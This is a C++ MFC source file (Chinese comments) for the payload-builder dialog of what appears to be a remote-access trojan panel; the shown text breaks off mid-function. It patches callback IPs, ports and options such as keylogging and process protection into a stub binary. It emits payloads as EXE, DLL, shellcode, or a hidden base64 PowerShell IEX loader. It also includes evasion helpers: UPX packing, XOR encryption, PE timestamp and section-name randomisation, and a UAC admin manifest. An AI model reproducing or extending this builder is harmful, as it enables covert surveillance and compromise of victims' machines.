// BuildDlg.cpp : 生成配置对话框实现
//

#include "stdafx.h"
#include "Quick.h"
#include "BuildDlg.h"
#include "Resource.h"
#include "base64.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// powershell上线用的base64 shellcode全局变量
unsigned char* powershellLogin = NULL;

IMPLEMENT_DYNCREATE(CBuildDlg, CXTPResizeFormView)

CBuildDlg::CBuildDlg()
	: CXTPResizeFormView(CBuildDlg::IDD)
	, m_edit_ip(_T(""))
	, m_edit_ip2(_T(""))
	, m_edit_ip3(_T(""))
	, m_edit_port(_T(""))
	, m_edit_port2(_T(""))
	, m_edit_port3(_T(""))
	, m_edit_first_time(_T("5000"))
	, m_edit_rest_time(_T("5000"))
	, m_edit_g(_T(""))
	, m_edit_v(_T(""))
	, m_edit_dll(_T(""))
	, m_edit_en(_T(""))
	, m_edit_powershell(_T(""))
	, m_buildonce(false)
	, drop(0)
{
	memset(writepath, 0, sizeof(writepath));
	memset(confi, 0, sizeof(confi));
}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeFormView::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_edit_ip);
	DDX_Text(pDX, IDC_EDIT_IP2, m_edit_ip2);
	DDX_Text(pDX, IDC_EDIT_IP3, m_edit_ip3);
	DDX_Text(pDX, IDC_EDIT_PORT, m_edit_port);
	DDX_Text(pDX, IDC_EDIT_PORT2, m_edit_port2);
	DDX_Text(pDX, IDC_EDIT_PORT3, m_edit_port3);
	DDX_Control(pDX, IDC_COMBO_NET, h_combo_net);
	DDX_Control(pDX, IDC_COMBO_NET2, h_combo_net2);
	DDX_Control(pDX, IDC_COMBO_NET3, h_combo_net3);
	DDX_Text(pDX, IDC_EDIT_FIRST_TIME, m_edit_first_time);
	DDX_Text(pDX, IDC_EDIT_REST_TIME, m_edit_rest_time);
	DDX_Text(pDX, IDC_EDIT8_G, m_edit_g);
	DDX_Text(pDX, IDC_EDIT_V, m_edit_v);
	DDX_Text(pDX, IDC_EDIT_DLL, m_edit_dll);
	DDX_Control(pDX, IDC_EDIT_TIP, m_edit_tip);
	DDX_Control(pDX, IDC_LIST_SET, m_list_set);
	DDX_Text(pDX, IDC_EDIT__POWERSHELL, m_edit_powershell);
	DDX_Control(pDX, IDC_STATIC_UPX, m_Dragupx);
	DDX_Control(pDX, IDC_STATIC_EN, m_Dragen);
	DDX_Control(pDX, IDC_STATIC_BYTE, m_Dragbyte);
	DDX_Control(pDX, IDC_STATIC_UAC, m_Draguac);
	DDX_Control(pDX, IDC_STATIC_DLLTOSHELLCODE, m_Dragdll2shellcode);
}

BEGIN_MESSAGE_MAP(CBuildDlg, CXTPResizeFormView)
	ON_WM_DROPFILES()
	ON_NOTIFY(NM_CLICK, IDC_LIST_SET, &CBuildDlg::OnClickListSet)
	ON_BN_CLICKED(IDC_BUILD_EXE, &CBuildDlg::OnBnClickedBuildexe)
	ON_BN_CLICKED(IDC_BUILD_DLL, &CBuildDlg::OnBnClickedBuilddll)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SET, &CBuildDlg::OnRclick)
	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER, &CBuildDlg::OnBnClickedButtonAddServer)
	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER2, &CBuildDlg::OnBnClickedButtonAddServer2)
	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER3, &CBuildDlg::OnBnClickedButtonAddServer3)
	ON_BN_CLICKED(IDC_BUILD_SHELLCODE, &CBuildDlg::OnBnClickedBuildShellcode)
	ON_BN_CLICKED(IDC_BUILD_POWERSHELL, &CBuildDlg::OnBnClickedBuildPowershell)
	ON_BN_CLICKED(IDC_BUILD_POWERSHELL_SET, &CBuildDlg::OnBnClickedBuildPowershellSet)
	ON_BN_CLICKED(IDC_BUTTON_POWERSHELL_GET, &CBuildDlg::OnBnClickedButtonPowershellGet)
	ON_BN_CLICKED(IDC_BUTTON_DECODE, &CBuildDlg::OnBnClickedButtonDecode)
	ON_BN_CLICKED(IDC_BUTTON_ENCODE, &CBuildDlg::OnBnClickedButtonEncode)
	ON_BN_CLICKED(IDC_BUTTON_POWERSHELL_OUT, &CBuildDlg::OnBnClickedButtonPowershellOut)
END_MESSAGE_MAP()

#ifdef _DEBUG
void CBuildDlg::AssertValid() const
{
	CXTPResizeFormView::AssertValid();
}

#ifndef _WIN32_WCE
void CBuildDlg::Dump(CDumpContext& dc) const
{
	CXTPResizeFormView::Dump(dc);
}
#endif
#endif

void CBuildDlg::OnInitialUpdate()
{
	CXTPResizeFormView::OnInitialUpdate();

	m_list_set.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_list_set.InsertColumn(0, _T("地址"), LVCF_TEXT, 150);
	m_list_set.InsertColumn(1, _T("端口"), LVCF_TEXT, 80);
	m_list_set.InsertColumn(2, _T("协议"), LVCF_TEXT, 80);

	UpdateData(FALSE);
}

BOOL CBuildDlg::PreTranslateMessage(MSG* pMsg)
{
	return CXTPResizeFormView::PreTranslateMessage(pMsg);
}

//////////////////////////////////////////////////////////////////////////
// 拖拽处理 - 判断拖放落点对应哪个静态图标控件
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::OnDropFiles(HDROP hDropInfo)
{
	TCHAR szFile[MAX_PATH] = { 0 };
	DragQueryFile(hDropInfo, 0, szFile, MAX_PATH);

	POINT pt;
	DragQueryPoint(hDropInfo, &pt);
	DragFinish(hDropInfo);

	// 将拖放坐标转为屏幕坐标再判断落在哪个控件
	ClientToScreen(&pt);

	CRect rcUpx, rcEn, rcByte, rcUac, rcDll2sc;
	m_Dragupx.GetWindowRect(&rcUpx);
	m_Dragen.GetWindowRect(&rcEn);
	m_Dragbyte.GetWindowRect(&rcByte);
	m_Draguac.GetWindowRect(&rcUac);
	m_Dragdll2shellcode.GetWindowRect(&rcDll2sc);

	if (rcUpx.PtInRect(pt))
	{
		upx(szFile);
		AfxMessageBox(_T("UPX压缩完成"));
	}
	else if (rcEn.PtInRect(pt))
	{
		encrypt(szFile);
		AfxMessageBox(_T("文件加密完成"));
	}
	else if (rcByte.PtInRect(pt))
	{
		change(szFile);
		AfxMessageBox(_T("文件转换完成"));
	}
	else if (rcUac.PtInRect(pt))
	{
		addordeluac(szFile);
		AfxMessageBox(_T("UAC处理完成"));
	}
	else if (rcDll2sc.PtInRect(pt))
	{
		dll2shellcode(szFile);
		AfxMessageBox(_T("DLL转ShellCode完成"));
	}
}

void CBuildDlg::OnClickListSet(NMHDR* pNMHDR, LRESULT* pResult)
{
	*pResult = 0;
}

void CBuildDlg::OnRclick(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	CMenu menu;
	menu.CreatePopupMenu();
	menu.AppendMenu(MF_STRING, 1, _T("删除"));

	CPoint pt;
	GetCursorPos(&pt);
	int sel = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN, pt.x, pt.y, this);
	if (sel == 1)
	{
		int nItem = pNMItemActivate->iItem;
		if (nItem >= 0)
			m_list_set.DeleteItem(nItem);
	}

	*pResult = 0;
}

//////////////////////////////////////////////////////////////////////////
// 添加服务器
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::OnBnClickedButtonAddServer()
{
	UpdateData(TRUE);
	if (m_edit_ip.IsEmpty() || m_edit_port.IsEmpty()) return;
	int n = m_list_set.GetItemCount();
	m_list_set.InsertItem(n, m_edit_ip);
	m_list_set.SetItemText(n, 1, m_edit_port);
	CString proto;
	h_combo_net.GetWindowText(proto);
	m_list_set.SetItemText(n, 2, proto);
}

void CBuildDlg::OnBnClickedButtonAddServer2()
{
	UpdateData(TRUE);
	if (m_edit_ip2.IsEmpty() || m_edit_port2.IsEmpty()) return;
	int n = m_list_set.GetItemCount();
	m_list_set.InsertItem(n, m_edit_ip2);
	m_list_set.SetItemText(n, 1, m_edit_port2);
	CString proto;
	h_combo_net2.GetWindowText(proto);
	m_list_set.SetItemText(n, 2, proto);
}

void CBuildDlg::OnBnClickedButtonAddServer3()
{
	UpdateData(TRUE);
	if (m_edit_ip3.IsEmpty() || m_edit_port3.IsEmpty()) return;
	int n = m_list_set.GetItemCount();
	m_list_set.InsertItem(n, m_edit_ip3);
	m_list_set.SetItemText(n, 1, m_edit_port3);
	CString proto;
	h_combo_net3.GetWindowText(proto);
	m_list_set.SetItemText(n, 2, proto);
}

//////////////////////////////////////////////////////////////////////////
// 收集配置数据 - 格式与上线模块解析格式匹配
// 上线模块用 _tcsrev 反转后解析 |p1:addr|o1:port|t1:proto|... 格式
//////////////////////////////////////////////////////////////////////////
BOOL CBuildDlg::getsettingdata()
{
	UpdateData(TRUE);
	if (m_list_set.GetItemCount() == 0)
	{
		AfxMessageBox(_T("请先添加服务器地址"));
		return FALSE;
	}

	memset(confi, 0, sizeof(confi));
	CString strConfi;

	// 从列表取最多3组地址
	for (int i = 0; i < m_list_set.GetItemCount() && i < 3; i++)
	{
		CString ip = m_list_set.GetItemText(i, 0);
		CString port = m_list_set.GetItemText(i, 1);
		CString proto = m_list_set.GetItemText(i, 2);

		CString pTag, oTag, tTag;
		pTag.Format(_T("|p%d:"), i + 1);
		oTag.Format(_T("|o%d:"), i + 1);
		tTag.Format(_T("|t%d:"), i + 1);

		BOOL bTcp = (proto.CompareNoCase(_T("TCP")) == 0) ? 1 : 0;
		CString item;
		item.Format(_T("%s%s%s%s%s%d"), pTag.GetString(), ip.GetString(),
			oTag.GetString(), port.GetString(), tTag.GetString(), bTcp);
		strConfi += item;
	}

	// 获取复选框状态
	CButton* pChkKeyboard = (CButton*)GetDlgItem(IDC_CHECK_KEYBOARD);
	CButton* pChkProtect = (CButton*)GetDlgItem(IDC_CHECK_PROTEXTEDPROCESS);
	CButton* pChkNet = (CButton*)GetDlgItem(IDC_CHECK_NET);
	CButton* pChkDaemon = (CButton*)GetDlgItem(IDC_CHECK_PROCESSDAEMON);
	CButton* pChkPuppet = (CButton*)GetDlgItem(IDC_CHECK_PUPPET);

	int nKeyboard = (pChkKeyboard && pChkKeyboard->GetCheck()) ? 1 : 0;
	int nProtect = (pChkProtect && pChkProtect->GetCheck()) ? 1 : 0;
	int nNet = (pChkNet && pChkNet->GetCheck()) ? 1 : 0;
	int nDaemon = (pChkDaemon && pChkDaemon->GetCheck()) ? 1 : 0;
	int nPuppet = (pChkPuppet && pChkPuppet->GetCheck()) ? 1 : 0;

	CString extra;
	extra.Format(_T("|dd:%s|cl:%s|fz:%s|bb:%s|bz:%s|jp:%d|sx:0|bh:%d|ll:%d|dl:%s|sh:%d|kl:%d|bd:0"),
		m_edit_first_time.GetString(),
		m_edit_rest_time.GetString(),
		m_edit_g.GetString(),
		m_edit_v.GetString(),
		m_edit_dll.GetString(),
		nKeyboard,
		nProtect,
		nNet,
		m_edit_dll.GetString(),
		nDaemon,
		nPuppet);
	strConfi += extra;

	// 反转字符串 - 上线模块解析时会先 _tcsrev 还原
	CString strReversed(strConfi);
	_tcsrev(strReversed.GetBuffer());
	strReversed.ReleaseBuffer();

	_tcscpy_s(confi, _countof(confi), strReversed.GetString());
	return TRUE;
}

void CBuildDlg::Setfindinfo(CString& s, const TCHAR* f1, TCHAR* outstring, BOOL user)
{
	int pos = s.Find(f1);
	if (pos != -1)
	{
		int startpos = pos + (int)_tcslen(f1);
		int endpos = s.Find(_T("|"), startpos);
		if (endpos == -1) endpos = s.GetLength();
		CString val = s.Mid(startpos, endpos - startpos);
		if (outstring)
			_tcscpy(outstring, val.GetString());
		if (user && val.GetLength() > 0 && val[val.GetLength() - 1] == _T('1'))
			user = TRUE;
	}
}

//////////////////////////////////////////////////////////////////////////
// 内存查找
//////////////////////////////////////////////////////////////////////////
int CBuildDlg::memfind(const char* mem, const char* str, int sizem, int sizes)
{
	for (int i = 0; i <= sizem - sizes; i++)
	{
		if (memcmp(mem + i, str, sizes) == 0)
			return i;
	}
	return -1;
}

int CBuildDlg::memfind(const char* mem, const TCHAR* str, int sizem, int sizes)
{
	for (int i = 0; i <= sizem - sizes; i++)
	{
		if (memcmp(mem + i, str, sizes) == 0)
			return i;
	}
	return -1;
}

//////////////////////////////////////////////////////////////////////////
// 修改配置并写入文件
// 在二进制中查找 "xiugaishiyong" 标记替换为配置数据
//////////////////////////////////////////////////////////////////////////
BOOL CBuildDlg::changedataandwritefile(CString path, BOOL bchangeexport)
{
	HANDLE hFile = CreateFile(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;

	DWORD dwSize = GetFileSize(hFile, NULL);
	char* pBuffer = new char[dwSize];
	DWORD dwRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
	CloseHandle(hFile);

	// 查找Unicode标记 "xiugaishiyong"
	const TCHAR* marker = _T("xiugaishiyong");
	int markerBytes = (int)(_tcslen(marker) * sizeof(TCHAR));
	int pos = memfind(pBuffer, marker, dwSize, markerBytes);

	if (pos != -1)
	{
		// 先清空标记区域（confi数组大小 = 1000 TCHAR）
		int clearSize = 1000 * sizeof(TCHAR);
		if (pos + clearSize > (int)dwSize)
			clearSize = dwSize - pos;
		memset(pBuffer + pos, 0, clearSize);

		// 写入配置数据
		int confiBytes = (int)(_tcslen(confi) * sizeof(TCHAR));
		if (confiBytes > 0 && (pos + confiBytes) <= (int)dwSize)
			memcpy(pBuffer + pos, confi, confiBytes);
	}

	// 修改导出函数名（DLL模式）
	if (bchangeexport && !m_edit_dll.IsEmpty())
	{
		// 在PE导出表中查找默认导出名并替换
		CStringA dllNameA(m_edit_dll);
		int expPos = memfind(pBuffer, "ServiceMain", dwSize, 11);
		if (expPos != -1 && dllNameA.GetLength() <= 11)
		{
			memset(pBuffer + expPos, 0, 11);
			memcpy(pBuffer + expPos, dllNameA.GetString(), dllNameA.GetLength());
		}
	}

	// 写回文件
	hFile = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwWritten = 0;
		WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL);
		CloseHandle(hFile);
	}

	delete[] pBuffer;
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
// 生成
//////////////////////////////////////////////////////////////////////////
BOOL CBuildDlg::build(int mode)
{
	if (!getsettingdata()) return FALSE;

	GetModuleFileName(NULL, writepath, MAX_PATH);
	(_tcsrchr(writepath, _T('\\')))[1] = 0;
	CString strPath(writepath);

	if (mode == 0) // EXE
	{
		CString srcPath32 = strPath + _T("Plugins\\x86\\上线模块.bin");
		CString srcPath64 = strPath + _T("Plugins\\x64\\上线模块.bin");

		CFileDialog dlg(FALSE, _T("exe"), _T("Server"), OFN_OVERWRITEPROMPT,
			_T("可执行文件 (*.exe)|*.exe||"));
		if (dlg.DoModal() != IDOK) return FALSE;

		CString outPath = dlg.GetPathName();
		CString outPath32 = outPath;
		CString outPath64 = outPath;
		outPath64.Replace(_T(".exe"), _T("_x64.exe"));

		CopyFile(srcPath32, outPath32, FALSE);
		changedataandwritefile(outPath32);

		CopyFile(srcPath64, outPath64, FALSE);
		changedataandwritefile(outPath64);

		AfxMessageBox(_T("EXE生成完成"));
	}
	else if (mode == 1) // DLL
	{
		CString srcPath32 = strPath + _T("Plugins\\x86\\上线模块.bin");

		CFileDialog dlg(FALSE, _T("dll"), _T("Server"), OFN_OVERWRITEPROMPT,
			_T("动态链接库 (*.dll)|*.dll||"));
		if (dlg.DoModal() != IDOK) return FALSE;

		CString outPath = dlg.GetPathName();
		CopyFile(srcPath32, outPath, FALSE);
		changedataandwritefile(outPath, TRUE);

		AfxMessageBox(_T("DLL生成完成"));
	}

	return TRUE;
}

void CBuildDlg::OnBnClickedBuildexe()
{
	build(0);
}

void CBuildDlg::OnBnClickedBuilddll()
{
	build(1);
}

//////////////////////////////////////////////////////////////////////////
// UPX压缩
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::upx(TCHAR* filePath)
{
	GetModuleFileName(NULL, writepath, MAX_PATH);
	(_tcsrchr(writepath, _T('\\')))[1] = 0;

	CString upxPath;
	upxPath.Format(_T("%sres\\upx.exe"), writepath);

	CString cmd;
	cmd.Format(_T("\"%s\" -9 \"%s\""), upxPath.GetString(), filePath);

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (CreateProcess(NULL, cmd.GetBuffer(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

//////////////////////////////////////////////////////////////////////////
// 异或加密
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::encrypt(TCHAR* filePath)
{
	HANDLE hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return;

	DWORD dwSize = GetFileSize(hFile, NULL);
	BYTE* pBuffer = new BYTE[dwSize];
	DWORD dwRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);

	for (DWORD i = 0; i < dwSize; i++)
		pBuffer[i] ^= 0x5A;

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD dwWritten = 0;
	WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL);
	CloseHandle(hFile);
	delete[] pBuffer;
}

//////////////////////////////////////////////////////////////////////////
// PE特征修改 - 修改时间戳、校验和、节名等
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::change(TCHAR* filePath)
{
	HANDLE hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return;

	DWORD dwSize = GetFileSize(hFile, NULL);
	BYTE* pBuffer = new BYTE[dwSize];
	DWORD dwRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);

	// 检查PE签名
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuffer;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { delete[] pBuffer; CloseHandle(hFile); return; }

	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBuffer + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) { delete[] pBuffer; CloseHandle(hFile); return; }

	// 随机化时间戳
	srand(GetTickCount());
	pNt->FileHeader.TimeDateStamp = (DWORD)time(NULL) - (rand() % 31536000);

	// 清零校验和
	pNt->OptionalHeader.CheckSum = 0;

	// 随机化节名 (保留第一个字符'.')
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
	for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
	{
		for (int j = 1; j < 7; j++)
		{
			if (pSection[i].Name[j] == 0) break;
			pSection[i].Name[j] = 'a' + (rand() % 26);
		}
	}

	// 写回
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD dwWritten = 0;
	WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL);
	CloseHandle(hFile);
	delete[] pBuffer;
}

//////////////////////////////////////////////////////////////////////////
// UAC manifest 添加/删除
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::addordeluac(TCHAR* filePath)
{
	// UAC提权manifest XML
	const char* manifest =
		"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n"
		"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n"
		"  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n"
		"    <security>\r\n"
		"      <requestedPrivileges>\r\n"
		"        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>\r\n"
		"      </requestedPrivileges>\r\n"
		"    </security>\r\n"
		"  </trustInfo>\r\n"
		"</assembly>\r\n";

	HANDLE hUpdate = BeginUpdateResourceA(CStringA(filePath).GetString(), FALSE);
	if (hUpdate == NULL) return;

	// 检查是否已有manifest —— 如果有则删除，没有则添加
	HMODULE hMod = LoadLibraryEx(filePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
	BOOL bHasManifest = FALSE;
	if (hMod)
	{
		HRSRC hRes = FindResource(hMod, MAKEINTRESOURCE(1), RT_MANIFEST);
		bHasManifest = (hRes != NULL);
		FreeLibrary(hMod);
	}

	if (bHasManifest)
	{
		// 删除manifest
		UpdateResourceA(hUpdate, (LPCSTR)RT_MANIFEST, MAKEINTRESOURCEA(1), 0, NULL, 0);
	}
	else
	{
		// 添加manifest
		UpdateResourceA(hUpdate, (LPCSTR)RT_MANIFEST, MAKEINTRESOURCEA(1),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
			(LPVOID)manifest, (DWORD)strlen(manifest));
	}

	EndUpdateResource(hUpdate, FALSE);
}

//////////////////////////////////////////////////////////////////////////
// DLL转ShellCode
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::dll2shellcode(TCHAR* filePath)
{
	CStringA inFileA(filePath);

	// 输出文件路径：原文件名 + .bin
	CStringA outFileA = inFileA + ".bin";

	TCHAR* result = dll_to_shellcode(inFileA, outFileA);
	if (result)
	{
		CString msg;
		msg.Format(_T("%s\r\n输出: %s"), result, CString(outFileA).GetString());
		AfxMessageBox(msg);
	}
}

//////////////////////////////////////////////////////////////////////////
// 写出资源文件
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::writerresour(int lpszType, LPCTSTR RName, LPCTSTR lpszName)
{
	HRSRC hRes = FindResource(NULL, RName, MAKEINTRESOURCE(lpszType));
	if (hRes == NULL) return;

	HGLOBAL hGlobal = LoadResource(NULL, hRes);
	if (hGlobal == NULL) return;

	LPVOID pData = LockResource(hGlobal);
	DWORD dwSize = SizeofResource(NULL, hRes);

	HANDLE hFile = CreateFile(lpszName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwWritten = 0;
		WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
		CloseHandle(hFile);
	}
}

//////////////////////////////////////////////////////////////////////////
// ShellCode生成
//////////////////////////////////////////////////////////////////////////
BOOL CBuildDlg::changeshellcodeandwritefile(CString path)
{
	return changedataandwritefile(path);
}

//////////////////////////////////////////////////////////////////////////
// PowerShell相关
//////////////////////////////////////////////////////////////////////////
BOOL CBuildDlg::changepowershellandwritefile(CString path32, CString path64, bool b_isx86)
{
	// 读取shellcode文件
	CString scPath = b_isx86 ? path32 : path64;

	HANDLE hFile = CreateFile(scPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;

	DWORD dwSize = GetFileSize(hFile, NULL);
	BYTE* pShellcode = new BYTE[dwSize];
	DWORD dwRead = 0;
	ReadFile(hFile, pShellcode, dwSize, &dwRead, NULL);
	CloseHandle(hFile);

	// 查找并替换配置标记
	const TCHAR* marker = _T("xiugaishiyong");
	int markerBytes = (int)(_tcslen(marker) * sizeof(TCHAR));
	int pos = memfind((const char*)pShellcode, marker, dwSize, markerBytes);
	if (pos != -1)
	{
		int confiBytes = (int)(_tcslen(confi) * sizeof(TCHAR));
		if (confiBytes > 0 && (pos + confiBytes) <= (int)dwSize)
		{
			memset((char*)pShellcode + pos, 0, 1000 * sizeof(TCHAR));
			memcpy((char*)pShellcode + pos, confi, confiBytes);
		}
	}

	// base64编码shellcode
	unsigned char* b64 = base64_encode(pShellcode, dwSize);
	delete[] pShellcode;

	if (b64)
	{
		// 更新全局powershell登录代码
		if (powershellLogin)
			free(powershellLogin);
		powershellLogin = b64;

		// 生成powershell命令并存入code
		code.Format(
			"$bhyy=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"%s\"));"
			"IEX (New-Object IO.StreamReader($bhyy)).ReadToEnd();",
			(char*)b64);
	}

	return TRUE;
}


static unsigned char* static_base64_encode(unsigned char* str, DWORD str_len)
{
	static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	DWORD out_len = 4 * ((str_len + 2) / 3);
	unsigned char* ret = (unsigned char*)malloc(out_len + 1);
	if (!ret) return NULL;
	DWORD i = 0, j = 0;
	for (; i + 2 < str_len; i += 3) {
		DWORD n = ((DWORD)str[i] << 16) | ((DWORD)str[i+1] << 8) | str[i+2];
		ret[j++] = b64[(n>>18)&0x3F]; ret[j++] = b64[(n>>12)&0x3F];
		ret[j++] = b64[(n>>6)&0x3F]; ret[j++] = b64[n&0x3F];
	}
	if (i < str_len) {
		DWORD n = (DWORD)str[i++] << 16;
		if (i < str_len) n |= (DWORD)str[i] << 8;
		ret[j++] = b64[(n>>18)&0x3F]; ret[j++] = b64[(n>>12)&0x3F];
		ret[j++] = (str_len % 3 == 2) ? b64[(n>>6)&0x3F] : '='; ret[j++] = '=';
	}
	ret[j] = '\0';
	return ret;
}

bool CBuildDlg::initpowershellcode()
{
	// 尝试加载默认shellcode生成powershell登录代码
	TCHAR szPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, szPath, MAX_PATH);
	(_tcsrchr(szPath, _T('\\')))[1] = 0;

	CString scPath;
	scPath.Format(_T("%sPlugins\\x86\\ShellCode.bin"), szPath);

	HANDLE hFile = CreateFile(scPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return true; // shellcode文件不存在时不算失败，只是powershell功能不可用

	DWORD dwSize = GetFileSize(hFile, NULL);
	BYTE* pData = new BYTE[dwSize];
	DWORD dwRead = 0;
	ReadFile(hFile, pData, dwSize, &dwRead, NULL);
	CloseHandle(hFile);

	// base64编码
	unsigned char* b64 = static_base64_encode(pData, dwSize);
	delete[] pData;

	if (b64)
	{
		if (powershellLogin)
			free(powershellLogin);
		powershellLogin = b64;
	}

	return true;
}

void CBuildDlg::WritepowershellInfo()
{
	UpdateData(TRUE);

	if (!getsettingdata()) return;

	GetModuleFileName(NULL, writepath, MAX_PATH);
	(_tcsrchr(writepath, _T('\\')))[1] = 0;

	CString strPath(writepath);
	CString path32 = strPath + _T("Plugins\\x86\\ShellCode.bin");
	CString path64 = strPath + _T("Plugins\\x64\\ShellCode.bin");

	// 用当前配置重新生成powershell代码
	changepowershellandwritefile(path32, path64, true);

	AfxMessageBox(_T("PowerShell配置已更新"));
}

void CBuildDlg::Writepowershellcmd()
{
	UpdateData(TRUE);

	// 从编辑框获取powershell脚本内容
	CString strText;
	m_edit_tip.GetWindowText(strText);

	if (strText.IsEmpty() && powershellLogin)
	{
		// 没有自定义内容，生成默认powershell命令
		code.Format(
			"$bhyy=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"%s\"));"
			"IEX (New-Object IO.StreamReader($bhyy)).ReadToEnd();",
			(char*)powershellLogin);
	}
	else
	{
		// 使用编辑框里的自定义内容
		CStringA strA(strText);
		unsigned char* b64 = base64_encode((unsigned char*)strA.GetString(), strA.GetLength());
		if (b64)
		{
			code.Format(
				"powershell -nop -w hidden -enc %s",
				(char*)b64);
			free(b64);
		}
	}
}

void CBuildDlg::WritePortInfo()
{
	UpdateData(TRUE);

	// 从界面读取地址端口信息添加到列表
	if (!m_edit_ip.IsEmpty() && !m_edit_port.IsEmpty())
		OnBnClickedButtonAddServer();
	if (!m_edit_ip2.IsEmpty() && !m_edit_port2.IsEmpty())
		OnBnClickedButtonAddServer2();
	if (!m_edit_ip3.IsEmpty() && !m_edit_port3.IsEmpty())
		OnBnClickedButtonAddServer3();
}

//////////////////////////////////////////////////////////////////////////
// Base64编解码
//////////////////////////////////////////////////////////////////////////
unsigned char* CBuildDlg::base64_encode(unsigned char* str, DWORD str_len)
{
	static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	DWORD out_len = 4 * ((str_len + 2) / 3);
	unsigned char* ret = (unsigned char*)malloc(out_len + 1);
	if (!ret) return NULL;

	DWORD i = 0, j = 0;
	for (; i + 2 < str_len; i += 3)
	{
		DWORD n = ((DWORD)str[i] << 16) | ((DWORD)str[i + 1] << 8) | str[i + 2];
		ret[j++] = b64[(n >> 18) & 0x3F];
		ret[j++] = b64[(n >> 12) & 0x3F];
		ret[j++] = b64[(n >> 6) & 0x3F];
		ret[j++] = b64[n & 0x3F];
	}

	if (i < str_len)
	{
		DWORD n = (DWORD)str[i++] << 16;
		if (i < str_len) n |= (DWORD)str[i] << 8;

		ret[j++] = b64[(n >> 18) & 0x3F];
		ret[j++] = b64[(n >> 12) & 0x3F];
		ret[j++] = (str_len % 3 == 2) ? b64[(n >> 6) & 0x3F] : '=';
		ret[j++] = '=';
	}

	ret[j] = '\0';
	return ret;
}

unsigned char* CBuildDlg::base64_decode(unsigned char* code)
{
	static const unsigned char d[] = {
		64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
		64,64,64,64,64,64,64,64,64,64,64,62,64,64,64,63,52,53,54,55,56,57,58,59,60,61,64,64,64,64,64,64,
